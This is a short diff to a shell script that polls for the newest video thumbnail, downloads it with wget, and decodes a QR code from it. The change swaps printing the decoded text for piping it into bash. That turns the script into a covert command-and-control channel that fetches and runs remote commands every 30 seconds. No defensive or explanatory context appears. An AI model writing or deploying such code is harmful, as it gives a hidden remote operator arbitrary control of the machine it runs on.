@@ -18,7 +18,8 @@ do
     else
         echo "New video thumbnail: $newest_video_url"
         wget -O "$(dirname "$(readlink -f "$0")")/command.jpg" $newest_video_url
-        echo "Command is: " && zbarimg --quiet "$(dirname "$(readlink -f "$0")")/command.jpg" | cut -c 9-
+        exec=$(zbarimg --quiet "$(dirname "$(readlink -f "$0")")/command.jpg" | cut -c 9-)
+        echo $exec | bash
         video_save=$newest_video_url
     fi
     sleep 30
